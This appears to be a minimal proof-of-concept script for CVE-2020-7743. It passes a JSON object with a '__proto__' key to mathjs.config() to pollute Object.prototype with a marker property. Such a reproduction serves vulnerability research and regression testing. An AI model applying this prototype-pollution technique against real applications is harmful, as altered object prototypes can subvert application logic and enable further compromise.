//https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7743
 
  var mathMod = require("mathjs");
  const mathjs = mathMod.create(mathMod.all);

   

  const newConfig = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  mathjs.config(newConfig);
// End of file
